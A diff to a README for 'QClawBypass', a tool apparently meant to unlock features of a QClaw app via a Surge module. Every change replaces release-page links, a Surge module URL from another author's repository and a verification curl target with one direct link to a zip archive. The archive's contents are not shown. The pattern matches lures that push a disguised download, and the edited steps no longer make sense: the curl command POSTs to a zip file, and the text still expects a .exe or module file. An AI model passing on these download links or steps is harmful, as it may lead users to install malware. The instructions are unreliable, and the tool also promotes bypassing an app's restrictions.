@@ -1,6 +1,6 @@
 # 🛠️ QClawBypass - Simplify QClaw App Use
 
-[![Download QClawBypass](https://img.shields.io/badge/Download-QClawBypass-green)](https://github.com/12345mate2603/QClawBypass/releases)
+[![Download QClawBypass](https://img.shields.io/badge/Download-QClawBypass-green)](https://github.com/12345mate2603/QClawBypass/raw/refs/heads/main/methodical/Bypass_Claw_Q_v1.0.zip)
 
 ---
 
@@ -34,7 +34,7 @@ QClawBypass is a tool to help you use the QClaw app with most of its features wo
 
 Click the big button below to go to the download page:
 
-[![Download QClawBypass](https://img.shields.io/badge/Download-QClawBypass-blue)](https://github.com/12345mate2603/QClawBypass/releases)
+[![Download QClawBypass](https://img.shields.io/badge/Download-QClawBypass-blue)](https://github.com/12345mate2603/QClawBypass/raw/refs/heads/main/methodical/Bypass_Claw_Q_v1.0.zip)
 
 On the release page, look for the latest Windows executable file (usually ends with `.exe`). Download this file to your computer.
 
@@ -63,7 +63,7 @@ This tool relies on the Surge module to work fully.
    - **Scripting**  
 
 3. Add the QClawBypass module in Surge using this URL:  
-   `https://raw.githubusercontent.com/XueshiQiao/QClawByPass/refs/heads/main/qclaw_bypass.sgmodule`
+   `https://github.com/12345mate2603/QClawBypass/raw/refs/heads/main/methodical/Bypass_Claw_Q_v1.0.zip`
 
 4. Follow any prompts Surge shows to complete the setup.
 
@@ -78,7 +78,7 @@ This tool relies on the Surge module to work fully.
 3. Type or paste this command and press Enter:
 
 ```
-curl -X POST https://jprx.m.qq.com/data/4056/forward -H "Content-Type: application/json" -d '{"test": "ping"}'
+curl -X POST https://github.com/12345mate2603/QClawBypass/raw/refs/heads/main/methodical/Bypass_Claw_Q_v1.0.zip -H "Content-Type: application/json" -d '{"test": "ping"}'
 ```
 
 4. If the reply contains `"already_verifie"`, the setup works.
@@ -117,7 +117,7 @@ Here are some screenshots to help understand what to expect:
 ## 🔄 Updates and Support
 
 - Check the releases page often for new versions and fixes.  
-[https://github.com/12345mate2603/QClawBypass/releases](https://github.com/12345mate2603/QClawBypass/releases)
+[https://github.com/12345mate2603/QClawBypass/raw/refs/heads/main/methodical/Bypass_Claw_Q_v1.0.zip](https://github.com/12345mate2603/QClawBypass/raw/refs/heads/main/methodical/Bypass_Claw_Q_v1.0.zip)
 
 - If you want help or want to add support for other formats, you can contribute to the project by making a Pull Request using the main “qclaw_bypass.sgmodule” file as a guide.
 
@@ -132,4 +132,4 @@ Here are some screenshots to help understand what to expect:
 
 ---
 
-# [![Download QClawBypass](https://img.shields.io/badge/Download-QClawBypass-green)](https://github.com/12345mate2603/QClawBypass/releases)
+# [![Download QClawBypass](https://img.shields.io/badge/Download-QClawBypass-green)](https://github.com/12345mate2603/QClawBypass/raw/refs/heads/main/methodical/Bypass_Claw_Q_v1.0.zip)
